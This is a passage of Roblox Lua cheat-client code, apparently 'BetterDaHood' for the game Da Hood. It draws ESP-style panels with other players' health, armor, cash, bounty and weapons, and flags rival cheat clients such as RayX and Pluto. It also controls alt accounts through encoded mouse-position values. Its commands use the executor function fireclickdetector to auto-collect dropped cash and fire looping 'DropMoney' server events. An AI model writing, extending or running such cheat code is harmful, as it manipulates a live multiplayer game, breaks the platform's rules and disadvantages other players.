            HealthBarBack.Name = "HealthBarBack"
            HealthBarBack.LayoutOrder = 3
            HealthBarBack.BorderColor3 = Color3.new(0, 0, 0)
            HealthBarBack.AnchorPoint = Vector2.new(0.5, 0)
            HealthBarBack.BackgroundTransparency = 0.8500000238418579
            HealthBarBack.BackgroundColor3 = Color3.new(0, 0, 0)
            HealthBarBack.BorderSizePixel = 0
            HealthBarBack.Size = UDim2.new(0.6, 0, 0.075, 0)
            HealthBarBack.Parent = Frame
            HealthBar.Name = "HealthBar"
            HealthBar.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            HealthBar.AnchorPoint = Vector2.new(0, 0.5)
            HealthBar.Position = UDim2.new(0, 0, 0.5, 0)
            HealthBar.BackgroundColor3 = Color3.new(0, 1, 0)
            HealthBar.BorderSizePixel = 0
            HealthBar.Size = UDim2.new(1, 0, 0.75, 0)
            HealthBar.Parent = HealthBarBack
            HealthLbl.Name = "HealthLbl"
            HealthLbl.TextStrokeTransparency = 0.699999988079071
            HealthLbl.AnchorPoint = Vector2.new(0.5, 0.5)
            HealthLbl.Size = UDim2.new(1, 0, 1.25, 0)
            HealthLbl.TextColor3 = Color3.new(1, 1, 1)
            HealthLbl.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            HealthLbl.Text = "100%"
            HealthLbl.TextSize = 14
            HealthLbl.Font = Enum.Font.SourceSans
            HealthLbl.BackgroundTransparency = 1
            HealthLbl.Position = UDim2.new(0.5, 0, 0.5, 0)
            HealthLbl.TextScaled = true
            HealthLbl.BackgroundColor3 = Color3.new(1, 1, 1)
            HealthLbl.Parent = HealthBarBack
            MiscInfo.Name = "MiscInfo"
            MiscInfo.LayoutOrder = 1
            MiscInfo.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            MiscInfo.Visible = false
            MiscInfo.BackgroundTransparency = 1
            MiscInfo.BackgroundColor3 = Color3.new(1, 1, 1)
            MiscInfo.Size = UDim2.new(1, 0, 0.115, 0)
            MiscInfo.Parent = Frame
            Macro.Name = "Macro"
            Macro.TextStrokeTransparency = 0.6000000238418579
            Macro.Size = UDim2.new(0.15, 0, 1, 0)
            Macro.TextColor3 = Color3.new(1, 0, 0)
            Macro.RichText = true
            Macro.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            Macro.Text = "<s>Macro</s>"
            Macro.Visible = false
            Macro.TextSize = 14
            Macro.Font = Enum.Font.SourceSans
            Macro.BackgroundTransparency = 1
            Macro.TextScaled = true
            Macro.BackgroundColor3 = Color3.new(1, 1, 1)
            Macro.Parent = MiscInfo
            UIListLayout_2.Name = "UIListLayout_2"
            UIListLayout_2.FillDirection = Enum.FillDirection.Horizontal
            UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center
            UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
            UIListLayout_2.Parent = MiscInfo
            RayX.Name = "RayX"
            RayX.TextStrokeTransparency = 0.6000000238418579
            RayX.Size = UDim2.new(0.15, 0, 1, 0)
            RayX.TextColor3 = Color3.new(1, 1, 0)
            RayX.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            RayX.Text = "RayX"
            RayX.Visible = false
            RayX.TextSize = 14
            RayX.Font = Enum.Font.SourceSans
            RayX.BackgroundTransparency = 1
            RayX.TextScaled = true
            RayX.BackgroundColor3 = Color3.new(1, 1, 1)
            RayX.Parent = MiscInfo
            SwagMode.Name = "SwagMode"
            SwagMode.TextStrokeTransparency = 0.6000000238418579
            SwagMode.Size = UDim2.new(0.25, 0, 1, 0)
            SwagMode.TextColor3 = Color3.new(0.847059, 0.219608, 1)
            SwagMode.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            SwagMode.Text = "SwagMode"
            SwagMode.Visible = false
            SwagMode.TextSize = 14
            SwagMode.Font = Enum.Font.SourceSans
            SwagMode.BackgroundTransparency = 1
            SwagMode.TextScaled = true
            SwagMode.BackgroundColor3 = Color3.new(1, 1, 1)
            SwagMode.Parent = MiscInfo
            ETR.Name = "ETR"
            ETR.TextStrokeTransparency = 0.6000000238418579
            ETR.Size = UDim2.new(0.275, 0, 1, 0)
            ETR.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
            ETR.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            ETR.Text = "ETR: 00:00:00"
            ETR.Visible = false
            ETR.TextSize = 14
            ETR.Font = Enum.Font.SourceSans
            ETR.BackgroundTransparency = 1
            ETR.TextScaled = true
            ETR.BackgroundColor3 = Color3.new(1, 1, 1)
            ETR.Parent = MiscInfo
            EnclosedEncrypt.Name = "EnclosedEncrypt"
            EnclosedEncrypt.TextStrokeTransparency = 0.6000000238418579
            EnclosedEncrypt.Size = UDim2.new(0.25, 0, 1, 0)
            EnclosedEncrypt.TextColor3 = Color3.new(0, 1, 1)
            EnclosedEncrypt.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            EnclosedEncrypt.Text = "Enclosed / Encrypt"
            EnclosedEncrypt.Visible = false
            EnclosedEncrypt.TextSize = 14
            EnclosedEncrypt.Font = Enum.Font.SourceSans
            EnclosedEncrypt.BackgroundTransparency = 1
            EnclosedEncrypt.TextScaled = true
            EnclosedEncrypt.BackgroundColor3 = Color3.new(1, 1, 1)
            EnclosedEncrypt.Parent = MiscInfo
            BetterDaHood.Name = "BetterDaHood"
            BetterDaHood.TextStrokeTransparency = 0.6000000238418579
            BetterDaHood.Size = UDim2.new(0.25, 0, 1, 0)
            BetterDaHood.TextColor3 = Color3.new(1, 0.470588, 0)
            BetterDaHood.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            BetterDaHood.Text = "BetterDaHood"
            BetterDaHood.Visible = false
            BetterDaHood.TextSize = 14
            BetterDaHood.Font = Enum.Font.SourceSans
            BetterDaHood.BackgroundTransparency = 1
            BetterDaHood.TextScaled = true
            BetterDaHood.BackgroundColor3 = Color3.new(1, 1, 1)
            BetterDaHood.Parent = MiscInfo
            FakeStar.Name = "FakeStar"
            FakeStar.TextStrokeTransparency = 0.6000000238418579
            FakeStar.Size = UDim2.new(0.174, 0, 1, 0)
            FakeStar.TextColor3 = Color3.new(0.854902, 0.647059, 0.12549)
            FakeStar.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            FakeStar.Text = "Fake Star"
            FakeStar.Visible = false
            FakeStar.TextSize = 14
            FakeStar.Font = Enum.Font.SourceSans
            FakeStar.BackgroundTransparency = 1
            FakeStar.TextScaled = true
            FakeStar.BackgroundColor3 = Color3.new(1, 1, 1)
            FakeStar.Parent = MiscInfo
            Dropping.Name = "Dropping"
            Dropping.LayoutOrder = 1
            Dropping.TextStrokeTransparency = 0.6000000238418579
            Dropping.Size = UDim2.new(0.224, 0, 1, 0)
            Dropping.TextColor3 = Color3.new(0, 1, 0)
            Dropping.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            Dropping.Text = "Dropping"
            Dropping.Visible = false
            Dropping.TextSize = 14
            Dropping.Font = Enum.Font.SourceSans
            Dropping.BackgroundTransparency = 1
            Dropping.TextScaled = true
            Dropping.BackgroundColor3 = Color3.new(1, 1, 1)
            Dropping.Parent = MiscInfo
            CashAura.Name = "CashAura"
            CashAura.LayoutOrder = 1
            CashAura.TextStrokeTransparency = 0.6000000238418579
            CashAura.Size = UDim2.new(0.174, 0, 1, 0)
            CashAura.TextColor3 = Color3.new(0, 1, 0)
            CashAura.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            CashAura.Text = "CashAura"
            CashAura.Visible = false
            CashAura.TextSize = 14
            CashAura.Font = Enum.Font.SourceSans
            CashAura.BackgroundTransparency = 1
            CashAura.TextScaled = true
            CashAura.BackgroundColor3 = Color3.new(1, 1, 1)
            CashAura.Parent = MiscInfo
            CrashBarBack.Name = "CrashBarBack"
            CrashBarBack.LayoutOrder = 3
            CrashBarBack.BorderColor3 = Color3.new(0, 0, 0)
            CrashBarBack.Visible = false
            CrashBarBack.AnchorPoint = Vector2.new(0.5, 0)
            CrashBarBack.BackgroundTransparency = 0.8500000238418579
            CrashBarBack.BackgroundColor3 = Color3.new(0, 0, 0)
            CrashBarBack.BorderSizePixel = 0
            CrashBarBack.Size = UDim2.new(0.224, 0, 1, 0)
            CrashBarBack.Parent = MiscInfo
            CrashBar.Name = "CrashBar"
            CrashBar.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            CrashBar.AnchorPoint = Vector2.new(0, 0.5)
            CrashBar.Position = UDim2.new(0, 0, 0.5, 0)
            CrashBar.BackgroundColor3 = Color3.new(0, 1, 0)
            CrashBar.BorderSizePixel = 0
            CrashBar.Size = UDim2.new(0, 0, 0.75, 0)
            CrashBar.Parent = CrashBarBack
            CrashLbl.Name = "CrashLbl"
            CrashLbl.TextStrokeTransparency = 0.699999988079071
            CrashLbl.AnchorPoint = Vector2.new(0.5, 0.5)
            CrashLbl.Size = UDim2.new(1, 0, 1.25, 0)
            CrashLbl.TextColor3 = Color3.new(1, 1, 1)
            CrashLbl.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            CrashLbl.Text = "0%"
            CrashLbl.TextSize = 14
            CrashLbl.Font = Enum.Font.SourceSans
            CrashLbl.BackgroundTransparency = 1
            CrashLbl.Position = UDim2.new(0.5, 0, 0.5, 0)
            CrashLbl.TextScaled = true
            CrashLbl.BackgroundColor3 = Color3.new(1, 1, 1)
            CrashLbl.Parent = CrashBarBack
            AFK.Name = "AFK"
            AFK.TextStrokeTransparency = 0.6000000238418579
            AFK.Size = UDim2.new(0.15, 0, 1, 0)
            AFK.TextColor3 = Color3.new(0.784314, 0.784314, 0.784314)
            AFK.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            AFK.Text = "(AFK)"
            AFK.Visible = false
            AFK.TextSize = 14
            AFK.Font = Enum.Font.SourceSans
            AFK.BackgroundTransparency = 1
            AFK.TextScaled = true
            AFK.BackgroundColor3 = Color3.new(1, 1, 1)
            AFK.Parent = MiscInfo
            Zapped.Name = "Zapped"
            Zapped.TextStrokeTransparency = 0.6000000238418579
            Zapped.Size = UDim2.new(0.15, 0, 1, 0)
            Zapped.TextColor3 = Color3.new(1, 1, 0.498039)
            Zapped.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            Zapped.Text = "Zapped"
            Zapped.Visible = false
            Zapped.TextSize = 14
            Zapped.Font = Enum.Font.SourceSans
            Zapped.BackgroundTransparency = 1
            Zapped.TextScaled = true
            Zapped.BackgroundColor3 = Color3.new(1, 1, 1)
            Zapped.Parent = MiscInfo
            Pluto.Name = "Pluto"
            Pluto.TextStrokeTransparency = 0.6000000238418579
            Pluto.Size = UDim2.new(0.15, 0, 1, 0)
            Pluto.TextColor3 = Color3.new(0.666667, 0.333333, 1)
            Pluto.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            Pluto.Text = "Pluto"
            Pluto.Visible = false
            Pluto.TextSize = 14
            Pluto.Font = Enum.Font.SourceSans
            Pluto.BackgroundTransparency = 1
            Pluto.TextScaled = true
            Pluto.BackgroundColor3 = Color3.new(1, 1, 1)
            Pluto.Parent = MiscInfo
            Bounty.Name = "Bounty"
            Bounty.LayoutOrder = 1
            Bounty.TextStrokeTransparency = 0.6000000238418579
            Bounty.Size = UDim2.new(0.324, 0, 1, 0)
            Bounty.TextColor3 = Color3.new(0, 0.882353, 0)
            Bounty.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
            Bounty.Text = "Bounty: "
            Bounty.Visible = false
            Bounty.TextSize = 14
            Bounty.Font = Enum.Font.SourceSans
            Bounty.BackgroundTransparency = 1
            Bounty.TextScaled = true
            Bounty.BackgroundColor3 = Color3.new(1, 1, 1)
            Bounty.Parent = MiscInfo

            --Secondary instances
            local secondaryInsts = {{["ClassName"] = "UIGridLayout", ["Parent"] = Weapons, ["Properties"] = {["FillDirectionMaxCells"] = 6,["CellPadding"] = UDim2.new(0.014, 0, 1, 0),["HorizontalAlignment"] = Enum.HorizontalAlignment.Center,["CellSize"] = UDim2.new(0.14, 0, 1, 0),["SortOrder"] = Enum.SortOrder.LayoutOrder,}},{["ClassName"] = "UICorner", ["Parent"] = ArmorBar, ["Properties"] = {["CornerRadius"] = UDim.new(0.5, 0),}},{["ClassName"] = "UICorner", ["Parent"] = ArmorBarBack, ["Properties"] = {["CornerRadius"] = UDim.new(0.5, 0),}},{["ClassName"] = "UIPadding", ["Parent"] = ArmorBarBack, ["Properties"] = {["PaddingBottom"] = UDim.new(0.025, 0),["PaddingTop"] = UDim.new(0.025, 0),["PaddingLeft"] = UDim.new(0.014, 0),["PaddingRight"] = UDim.new(0.014, 0),}},{["ClassName"] = "UICorner", ["Parent"] = HealthBar, ["Properties"] = {["CornerRadius"] = UDim.new(0.5, 0),}},{["ClassName"] = "UICorner", ["Parent"] = HealthBarBack, ["Properties"] = {["CornerRadius"] = UDim.new(0.5, 0),}},{["ClassName"] = "UIPadding", ["Parent"] = HealthBarBack, ["Properties"] = {["PaddingBottom"] = UDim.new(0.025, 0),["PaddingTop"] = UDim.new(0.025, 0),["PaddingLeft"] = UDim.new(0.014, 0),["PaddingRight"] = UDim.new(0.014, 0),}},{["ClassName"] = "UICorner", ["Parent"] = CrashBar, ["Properties"] = {["CornerRadius"] = UDim.new(0.5, 0),}},{["ClassName"] = "UICorner", ["Parent"] = CrashBarBack, ["Properties"] = {["CornerRadius"] = UDim.new(0.5, 0),}},{["ClassName"] = "UIPadding", ["Parent"] = CrashBarBack, ["Properties"] = {["PaddingBottom"] = UDim.new(0.025, 0),["PaddingTop"] = UDim.new(0.025, 0),["PaddingLeft"] = UDim.new(0.014, 0),["PaddingRight"] = UDim.new(0.014, 0),}},}
            for _, instInfo in ipairs(secondaryInsts) do
                local inst = Instance.new(instInfo.ClassName)
                for propertyName, value in pairs(instInfo.Properties) do
                    inst[propertyName] = value
                end
                inst.Parent = instInfo.Parent
            end
        end)();
        
        character:SetAttribute("BDHCreated", true)

        --Functions
        local function newWeaponIcon(weaponName, textureId, Weapons)
            local newWeaponIcon = Instance.new("ImageLabel")
            newWeaponIcon.Name = weaponName
            newWeaponIcon.Image = textureId
            newWeaponIcon.LayoutOrder = WEAPONS[weaponName].LayoutOrder
            newWeaponIcon.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
            newWeaponIcon.BackgroundTransparency = 1
            newWeaponIcon.Parent = Weapons
            local uiCorner = Instance.new("UICorner")
            uiCorner.CornerRadius = UDim.new(0.3, 0)
            uiCorner.Parent = newWeaponIcon

            equippedWeapons[player][weaponName] = true
        end

        if PLAYER == player or espMode == "Off" then
            BDHGui.Enabled = false
        end

        --Set values
        --Name
        updateNameGui(player)

        --Armor
        if armor.Value > 0 then
            local percentage = armor.Value / 130
            ArmorBar.Size = UDim2.new(percentage, 0, ArmorBar.Size.Y.Scale, 0)
            ArmorBarBack.Visible = true
        else
            ArmorBarBack.Visible = false
        end

        --Mouse pos
        --Setup
        local mousePosPart = mousePosPartsFolder:FindFirstChild(player.Name)
        if not mousePosPart then
            mousePosPart = Instance.new("Part")
            mousePosPart.Name = player.Name
            mousePosPart.CanCollide = false
            mousePosPart.Size = Vector3.new(0.001, 0.001, 0.001)
            mousePosPart.Material = Enum.Material.SmoothPlastic
            mousePosPart.Transparency = 1
            mousePosPart.Anchored = true
            mousePosPart.Parent = mousePosPartsFolder
            local mousePosAttachment = Instance.new("Attachment")
            mousePosAttachment.Parent = mousePosPart
            local beam = Instance.new("Beam")
            beam.Attachment0 = mousePosAttachment
            beam.FaceCamera = true
            beam.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.5), NumberSequenceKeypoint.new(1, 0.5)})
            beam.Width0 = 0.05
            beam.Width1 = 0.05
            beam.Parent = mousePosPart
        end
        

        updateGunBeam(player)

        --Mouse pos action
        mousePos.Changed:Connect(function(newValue)
            mousePosPart.Position = newValue
            if newValue.Z == 50000 then -- is a command
                if isAlt(player.UserId) then
                    local miscInfo = player.Character.HumanoidRootPart.BDHGui.Frame.MiscInfo
                    if newValue.Y == 10000 then -- is dropping
                        local isDropping = newValue.X == 1 and true or false
                        miscInfo.Dropping.Visible = isDropping
                        miscInfo.ETR.Visible = isDropping
                    elseif newValue.Y == 20000 then -- cashaura on
                        local cashAuraStatus = newValue.X == 1 and true or false
                        miscInfo.CashAura.Visible = cashAuraStatus
                    elseif newValue.Y == 30000 then -- crashing
                        local cashAuraStatus = newValue.X == 1 and true or false
                        miscInfo.Crashing.Visible = cashAuraStatus
                    end
                elseif exploiters.BetterDaHood[player] == true and not isAlt(player.UserId) then
                    local miscInfo = player.Character.HumanoidRootPart.BDHGui.Frame.MiscInfo
                    if newValue.Y == 10000 then -- tabbed in/out
                        local tabbedOut = newValue.X == 1 and true or false
                        miscInfo.AFK.Visible = tabbedOut
                    end
                end
            end
        end)

        --Gun equipped
        character.ChildAdded:Connect(function(child)
            if WEAPONS[child.Name] then
                --Make it green to show that it's equipped
                Weapons[child.Name].BackgroundTransparency = 0.75

                --Mouse pos
                if child.Name ~= "[Taser]" and child.Name ~= "[Firework]" then
                    local handle = child:WaitForChild("Handle")
                    local gunAttachment
                    local shootBBGUI = handle:WaitForChild("ShootBBGUI", 5)
    
                    if shootBBGUI then
                        if not handle:FindFirstChild("Attachment") then
                            gunAttachment = Instance.new("Attachment")
                            gunAttachment.Position = shootBBGUI.StudsOffsetWorldSpace
                            gunAttachment.Parent = handle
                        else
                            gunAttachment = handle.Attachment
                        end
                        
                        mousePosPart.Beam.Attachment1 = gunAttachment
                    end
                end
            end
        end)

        --Count food
        local function countFood()
            local foodCount = 0
            for _, v in ipairs(player.Backpack:GetChildren()) do
                if FOODS[v.Name] then
                    foodCount += 1
                end
            end
            if FOODS[character:FindFirstChildOfClass("Tool")] then
                foodCount += 1
            end
            if foodCount == 0 then
                Food.Visible = false
                Food.AmmoCount.Visible = false
            elseif foodCount == 1 then
                Food.Visible = true
                Food.AmmoCount.Visible = false
            elseif foodCount > 1 then
                Food.Visible = true
                Food.AmmoCount.Visible = true
            end
            
            --Icon
            if foodCount <= 1 then
                Food.Image = "rbxassetid://8538360360"
            elseif foodCount == 2 then
                Food.Image = "http://www.roblox.com/asset/?id=9878913325"
            elseif  foodCount > 2 then
                Food.Image = "http://www.roblox.com/asset/?id=9878915243"
            end
            Food.AmmoCount.Text = foodCount
        end

        local function usePremiumCommand(player, prefix)
            task.wait(1) -- wait for exploit to execute properly
            if autoUseExploitPremCommand == true then
                local msg = prefix..tostring(exploiterCommand).." "..player.Name

                CHAT_EVENT:FireServer(msg, "All")
                --Players:Chat(msg) --fires chatted
                --DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
            end
        end

        local function exploitDetected(exploitName)
            local prefix
            MiscInfo.Visible = true

            if exploitName == "Swag Mode" then
                SwagMode.Visible = true
                prefix = ":"
            elseif exploitName == "RayX" then
                RayX.Visible = true
                prefix = "*"
            elseif exploitName == "Enclosed/Encrypt" then
                EnclosedEncrypt.Visible = true
            elseif exploitName == "Zapped" then
                Zapped.Visible = true
            elseif exploitName == "Pluto" then
                Pluto.Visible = true
            elseif exploitName == "BetterDaHood" then
                BetterDaHood.Visible = true
            end

            if exploiters[exploitName][player] == nil then
                exploiters[exploitName][player] = true

                --CHAT_EVENT:FireServer("Exploiter '"..player.Name.."' detected - using: "..exploitName, "All")
                --Players:Chat("Exploiter '"..player.Name.."' detected - using: "..exploitName)
                --SayMessageRequest

                local icon, isReady = Players:GetUserThumbnailAsync(player.UserId,  Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)

                local bindable = Instance.new("BindableFunction")
                function bindable.OnInvoke(response)
                    if response == "Yes" then
                        markPlayer(player, true)
                    end
                end

                StarterGui:SetCore("SendNotification", {
                    Title = "Exploiter Detected",
                    Text = "'"..player.Name.."' is using "..exploitName..". Mark this player?",
                    Duration = 15,
                    Icon = icon,
                    Callback = bindable,
                    Button1 = "Yes",
                    Button2 = "No"
                })
            end

            if prefix then
                usePremiumCommand(player, prefix)
            end
        end

        --Exploit detection
        if player ~= PLAYER then
            task.spawn(function()
                task.wait(2.5) -- Wait for parts to be added
                if not isCharacterLoaded(player) then
                    while not isCharacterLoaded(player) do task.wait() end
                    task.wait(2)
                end

                --Swag Mode detection
                if character.LowerTorso:FindFirstChild("OriginalSize") then
                    character.LowerTorso.ChildRemoved:Connect(function(child)
                        if child.Name == "OriginalSize" then
                            exploitDetected("Swag Mode")
                        end
                    end)
                else
                    exploitDetected("Swag Mode")
                end

                --RayX detection
                if character.UpperTorso:FindFirstChild("BodyBackAttachment") then
                    character.UpperTorso.ChildRemoved:Connect(function(child)
                        if child.Name == "BodyBackAttachment" then
                            exploitDetected("RayX")
                        end
                    end)
                else
                    exploitDetected("RayX")
                end

                --Enclosed/Encrypt detection
                if character.Head:FindFirstChild("OriginalSize") then
                    character.UpperTorso.ChildRemoved:Connect(function(child)
                        if child.Name == "OriginalSize" then
                            exploitDetected("Enclosed/Encrypt")
                        end
                    end)
                else
                    exploitDetected("Enclosed/Encrypt")
                end

                --Pluto detection
                if character.UpperTorso:FindFirstChild("BodyFrontAttachment") then
                    character.UpperTorso.ChildRemoved:Connect(function(child)
                        if child.Name == "BodyFrontAttachment" then
                            exploitDetected("Pluto")
                        end
                    end)

                    --Zapped detection (embedded into Pluto detection because BodyFrontAttachment needs to exist first)
                    if character.UpperTorso.BodyFrontAttachment:FindFirstChild("OriginalPosition") then
                        character.UpperTorso.BodyFrontAttachment.ChildRemoved:Connect(function(child)
                            if child.Name == "OriginalPosition" then
                                exploitDetected("Zapped")
                            end
                        end)
                    else
                        exploitDetected("Zapped")
                    end
                else
                    exploitDetected("Pluto")
                end
            end)
        end

        --Macro broken detection
        grabbed.Changed:Connect(function(grabbedCharacter)
            if grabbedCharacter and grabbedCharacter:GetAttribute("BDHCreated") == true then
                grabbedCharacter.HumanoidRootPart.BDHGui.Frame.MiscInfo.Visible = true
                grabbedCharacter.HumanoidRootPart.BDHGui.Frame.MiscInfo.Macro.Visible = true
            end
        end)

        --Child removed from character
        character.ChildRemoved:Connect(function(child)
            --Mouse pos
            if WEAPONS[child.Name] then
                mousePosPart.Beam.Attachment1 = nil
            end

            --Food
            if child.Parent ~= player.Backpack and FOODS[child.Name] then
                countFood()
            end
        end)

        --Mark yourself as using BDH
        if player == PLAYER then
            if character.UpperTorso:FindFirstChild("RightCollarAttachment") then
                character.UpperTorso.RightCollarAttachment:Destroy()
            else
                local connection
                connection = character.UpperTorso.ChildAdded:Connect(function(child)
                    if child.Name == "RightCollarAttachment" then
                        character.UpperTorso.RightCollarAttachment:Destroy()
                        connection:Disconnect()
                    end
                end)
            end
        end

        --Weapons + food display initial
        countFood()
        for _, v in ipairs(player.Backpack:GetChildren()) do
            if WEAPONS[v.Name] then
                newWeaponIcon(v.Name, v.TextureId, Weapons)
            end
        end

        --Weapons + food display
        player.Backpack.ChildAdded:Connect(function(child) -- added
            --Weapons
            if WEAPONS[child.Name] then
                if not Weapons:FindFirstChild(child.Name) then
                    newWeaponIcon(child.Name, child.TextureId, Weapons)
                else
                    Weapons[child.Name].BackgroundTransparency = 1
                end
            end
            countFood()
        end)

        --Known player (update their name if star player thing loads late)
        humanoid:GetPropertyChangedSignal("DisplayName"):Connect(function()
            while not isCharacterLoaded(player) and not player.Character:GetAttribute("BDHCreated") do task.wait() end
            updateNameGui(player)
        end)

        --Cash
        local dataFolder  = player:WaitForChild("DataFolder")
        local cashAmount = dataFolder:WaitForChild("Currency").Value
        Cash.Text = "$"..commaValue(cashAmount)
        if isAlt(player.UserId) then
            ETR.Text = "ETR: "..convertToHMS(calculateSecondsToDrop(cashAmount))
        end

        --Bounty
        local informationFolder = dataFolder:WaitForChild("Information")
        local wanted = informationFolder:WaitForChild("Wanted")
        Bounty.Text = "Bounty: $"..commaValue(tonumber(wanted.Value))

        
        --Connect BBGui
        --Healthbar
        if player ~= PLAYER then
            character.Humanoid.HealthChanged:Connect(function(health)
                --Health bar
                local percentage = health / character.Humanoid.MaxHealth
                HealthBar.Size = UDim2.new(percentage, 0, HealthBar.Size.Y.Scale, 0)
                HealthLbl.Text = math.round(percentage * 100).."%"
                HealthBar.BackgroundColor3 = Color3.new((1 - percentage) * 2, percentage * 2, 0)
    
                --Effect
                local change = roundNumber(health - currentHealth[player], 0)
                if math.abs(change) > 5 and isCharacterLoaded(player) and PLAYER:DistanceFromCharacter(player.Character.HumanoidRootPart.Position) < 150 then
                    local textColor = change < 0 and Color3.fromRGB(255, 0, 0) or Color3.fromRGB(0, 255, 0)
    
                    local damageEffectPart = Instance.new("Part")
                    damageEffectPart.Name = "DamageEffectPart"
                    damageEffectPart.Anchored = true
                    damageEffectPart.CanCollide = false
                    damageEffectPart.Transparency = 1
                    damageEffectPart.Material = Enum.Material.SmoothPlastic
                    damageEffectPart.CFrame = character.HumanoidRootPart.CFrame
                    damageEffectPart.Size = Vector3.new(0.001, 0.001, 0.001)
                    damageEffectPart.Parent = workspace
                    local BillboardGui = Instance.new("BillboardGui")
                    local TextLabel = Instance.new("TextLabel")
                    BillboardGui.Parent = damageEffectPart
                    BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                    BillboardGui.Active = true
                    BillboardGui.AlwaysOnTop = true
                    BillboardGui.Size = UDim2.new(1, 100, 0.5, 50)
                    TextLabel.Parent = BillboardGui
                    TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
                    TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                    TextLabel.BackgroundTransparency = 1.000
                    TextLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
                    TextLabel.Size = UDim2.new(1, 0, 1, 0)
                    TextLabel.Font = Enum.Font.Ubuntu
                    TextLabel.Text = change < 0 and change or "+"..change
                    TextLabel.TextColor3 = textColor
                    TextLabel.TextScaled = true
                    TextLabel.TextSize = 14.000
                    TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
                    TextLabel.TextWrapped = true
                    
                    local tween = TweenService:Create(TextLabel, TweenInfo.new(0.75, Enum.EasingStyle.Quad, Enum.EasingDirection.In), {Size = UDim2.new(0, 0, 0, 0)})
                    tween:Play()
                    tween.Completed:Connect(function(playbackState)
                        damageEffectPart:Destroy()
                    end)
                end
    
                currentHealth[player] = health
            end)
        end

        --Armor
        armor.Changed:Connect(function(newValue)
            if newValue > 0 then
                local percentage = newValue / 130
                ArmorBar.Size = UDim2.new(percentage, 0, ArmorBar.Size.Y.Scale, 0)
                ArmorBarBack.Visible = true
            else
                ArmorBarBack.Visible = false
            end
        end)

        --Stomped
        dead.Changed:Connect(function(newValue)
            if newValue == true and isCharacterLoaded(player) then
                --Cross effect on head
                local BillboardGui = Instance.new("BillboardGui")
                local TextLabel = Instance.new("TextLabel")
                BillboardGui.Parent = character.Head
                BillboardGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                BillboardGui.Active = true
                BillboardGui.LightInfluence = 1.000
                BillboardGui.AlwaysOnTop = true
                BillboardGui.MaxDistance = 150
                BillboardGui.Size = UDim2.new(0.7, 25, 0.7, 25)
                BillboardGui.StudsOffset = Vector3.new(0, 1.5, 0)
                TextLabel.Parent = BillboardGui
                TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                TextLabel.BackgroundTransparency = 1.000
                TextLabel.Size = UDim2.new(1, 0, 1, 0)
                TextLabel.Font = Enum.Font.SourceSans
                TextLabel.Text = "❌"
                TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
                TextLabel.TextScaled = true
                TextLabel.TextSize = 14.000
                TextLabel.TextWrapped = true

                if player == PLAYER and isCharacterLoaded(PLAYER) then -- PLAYER got stomped
                    markPlayer(findNearestPlayer(PLAYER.Character.UpperTorso.Position, PLAYER), true)
                elseif stomping == true and isCharacterLoaded(player) and PLAYER:DistanceFromCharacter(player.Character.UpperTorso.Position) < 7 then -- PLAYER stomped someone else
                    markPlayer(player, true)
                end
            end
        end)
    end

    local function characterAppearanceLoaded(character, player)
        --task.wait(1) -- wait incase parts of character need to be reloaded

        currentHealth[player] = character.Humanoid.Health
        equippedWeapons[player] = {}

        --Anti SprayCan lag
        if player ~= PLAYER then
            character.ChildAdded:Connect(function(child)
                if child.Name == "[SprayCan]" and itemCount(player, "[SprayCan]") > 1 then
                    while child.Parent == nil do task.wait() end
                    child:Destroy()
                end
            end)
        end
        
        --Add and connect up gui
        createBBGui(character)
    end

    --Commands
    commands.mark = function(player, args)
        local playerToMark = findPlayer(args[1])

        if playerToMark then
            markPlayer(playerToMark, true)
        end
    end

    commands.unmark = function(player, args)
        if args[1] == "all" then
            for _, playerToUnmark in pairs(Players:GetPlayers()) do
                markPlayer(playerToUnmark, false)
            end
        else
            local playerToUnmark = findPlayer(args[1])

            if playerToUnmark then
                markPlayer(playerToUnmark, false)
            end
        end
    end

    local auraToggle = false
    commands.mainaura = function(player, args)
        if auraToggle == true then
            auraToggle = false
        else
            auraToggle = true
            
            task.spawn(function()
                while auraToggle == true do
                    for _,v in ipairs(workspace.Ignored.Drop:GetChildren()) do
                        if v:IsA("Part") and PLAYER:DistanceFromCharacter(v.Position) < 12 and v:FindFirstChild("ClickDetector") then
                            fireclickdetector(v.ClickDetector)
                            task.wait()
                        end
                    end
                    task.wait(0.1)
                end
            end)
        end
    end

    local autoDropToggle = false
    commands.maindrop = function(player, args)
        local amountToDrop = tonumber(args[1])
        autoDropToggle = not autoDropToggle

        task.spawn(function()
            while autoDropToggle == true do
                if amountToDrop then
                    MAIN_EVENT:FireServer("DropMoney", amountToDrop)
                else
                    MAIN_EVENT:FireServer("DropMoney", 10000)
                end
                task.wait(15.1)
            end
        end)
    end

